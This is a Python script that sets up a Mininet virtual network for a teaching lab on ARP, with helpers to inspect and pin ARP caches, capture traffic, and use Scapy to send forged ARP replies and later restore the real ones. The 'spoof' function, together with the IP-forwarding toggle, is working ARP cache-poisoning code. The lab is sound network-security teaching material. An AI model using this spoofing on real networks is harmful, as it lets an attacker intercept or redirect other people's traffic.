#!/usr/bin/env python3
"""lab-up.py - Mininet topology and helper methods for the ARP lab.

Topology:
    Alice (10.0.0.1) --- s1 === s2 --- Bob (10.0.0.3)
                         |
                        Eve (10.0.0.2)
"""

import os
import sys
import time

from mininet.cli import CLI
from mininet.net import Mininet
from mininet.node import OVSBridge
from mininet.topo import Topo
from scapy.all import ARP, Ether, rdpcap, send, srp, wrpcap

SELF = os.path.abspath(__file__)


class ArpLab(Topo):
    """2-switch, 3-host topology + helper methods used by scene1/2/3.py."""

    # ---- 1. Build network topology -----------------------------------

    def build(self):
        s1 = self.addSwitch('s1')
        s2 = self.addSwitch('s2')

        alice = self.addHost('Alice', ip='10.0.0.1/24', mac='00:00:00:00:00:01')
        eve = self.addHost('Eve', ip='10.0.0.2/24', mac='00:00:00:00:00:02')
        bob = self.addHost('Bob', ip='10.0.0.3/24', mac='00:00:00:00:00:03')

        self.addLink(alice, s1)
        self.addLink(eve, s1)
        self.addLink(bob, s2)
        self.addLink(s1, s2)

    # ---- 2. Host ARP / ping commands (via host.cmd) ------------------

    def flush_arp(self, *hosts):
        """Clear the ARP cache on each given host."""
        for h in hosts:
            h.cmd('ip neigh flush all')

    def dump_arp(self, *hosts):
        """Print the ARP cache of each given host."""
        for h in hosts:
            text = h.cmd('ip -color=never neigh show').strip()
            print('---', h.name, '---')
            print(text if text else '(empty)')

    def arp_table(self, host):
        """Return host's ARP cache as a dict: {ip: mac}."""
        table = {}
        for line in host.cmd('ip -color=never neigh show').splitlines():
            parts = line.split()
            if 'lladdr' in parts:
                ip = parts[0]
                mac = parts[parts.index('lladdr') + 1]
                table[ip] = mac
        return table

    def pin(self, host, ip, mac):
        """Add a permanent static ARP entry on `host`."""
        intf = host.defaultIntf().name
        host.cmd(f'ip neigh replace {ip} lladdr {mac} nud permanent dev {intf}')

    def forward(self, host, on=1):
        """Enable (1) or disable (0) IPv4 packet forwarding on `host`."""
        host.cmd(f'sysctl -w net.ipv4.ip_forward={int(on)}')

    def ping(self, src, dst, count=2):
        """Send ICMP ping from `src` host to `dst` host."""
        print(src.cmd(f'ping -c {count} -W 2 {dst.IP()}'))

    # ---- 3. ARP packet actions (runs Scapy inside the host) ----------

    def as_host(self, host, *args):
        """Run this script inside `host` so Scapy uses that host's NIC."""
        arg_str = ' '.join(args)
        return host.cmd(f'python3 "{SELF}" {arg_str}')

    def get_mac(self, host, ip):
        """Ask `host` to send an ARP request for `ip` and return the MAC."""
        output = self.as_host(host, 'get_mac', ip).strip()
        if not output:
            return None
        mac = output.splitlines()[-1].strip()
        return mac if ':' in mac else None

    def spoof(self, host, target_ip, spoofed_ip):
        """Send a fake ARP reply from `host` telling `target_ip` that `spoofed_ip` is at `host`'s MAC."""
        self.as_host(host, 'spoof', target_ip, spoofed_ip)

    def restore(self, host, target_ip, real_ip):
        """Send the real MAC of `real_ip` back to `target_ip`."""
        self.as_host(host, 'restore', target_ip, real_ip)

    # ---- 4. Packet capture (tcpdump on each host) --------------------

    def pcap_start(self, path, *hosts):
        """Start background tcpdump on each host."""
        self.pcap_path = os.path.abspath(path)
        self.pcap_hosts = hosts
        for h in hosts:
            tmp = f'/tmp/{h.name}.pcap'
            h.cmd(f'rm -f {tmp}')
            h.cmd(f'tcpdump -n -i {h.defaultIntf()} -U -w {tmp} arp or icmp >/dev/null 2>&1 &')
        time.sleep(1)
        print('    capturing to', self.pcap_path)

    def pcap_stop(self):
        """Stop tcpdump on each host and combine packets into one pcap."""
        pkts = []
        for h in self.pcap_hosts:
            h.cmd('pkill -INT tcpdump; wait')
            tmp = f'/tmp/{h.name}.pcap'
            if os.path.exists(tmp) and os.path.getsize(tmp) > 24:
                pkts.extend(rdpcap(tmp))

        pkts.sort(key=lambda p: float(p.time))
        wrpcap(self.pcap_path, pkts)
        os.chmod(self.pcap_path, 0o644)
        print('    wrote', self.pcap_path)
        print('   ', os.path.getsize(self.pcap_path), 'bytes,', len(pkts), 'packets')


# ---- Host-side Scapy functions (run when as_host calls this file) ----

def who_has(ip):
    """Broadcast ARP who-has for `ip` and return the answered MAC."""
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=5, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return ''


def send_arp_reply(target_ip, source_ip, source_mac=None):
    """Send an ARP reply (op=2) to `target_ip` claiming `source_ip`."""
    if source_mac:
        packet = ARP(op=2, pdst=target_ip, psrc=source_ip, hwsrc=source_mac)
    else:
        packet = ARP(op=2, pdst=target_ip, psrc=source_ip)
    send(packet, verbose=False)


def host_side(argv):
    """Run the requested Scapy action inside a host namespace."""
    action = argv[0]
    if action == 'get_mac':
        ip = argv[1]
        return who_has(ip)
    elif action == 'spoof':
        target_ip, spoofed_ip = argv[1], argv[2]
        send_arp_reply(target_ip, spoofed_ip)
    elif action == 'restore':
        target_ip, real_ip = argv[1], argv[2]
        real_mac = who_has(real_ip)
        if real_mac:
            send_arp_reply(target_ip, real_ip, real_mac)
    return ''


# ---- Startup ---------------------------------------------------------

def start():
    """Start the Mininet lab and return (net, lab, alice, bob, eve)."""
    if os.geteuid() != 0:
        sys.exit('Run as root: sudo python3 scene1.py')

    lab = ArpLab()
    net = Mininet(topo=lab, switch=OVSBridge, controller=None)
    net.start()
    return net, lab, net.get('Alice'), net.get('Bob'), net.get('Eve')


if __name__ == '__main__':
    if len(sys.argv) > 1:
        print(host_side(sys.argv[1:]))
        sys.exit(0)

    net, lab, alice, bob, eve = start()
    try:
        CLI(net)
    finally:
        net.stop()
    print('lab done')
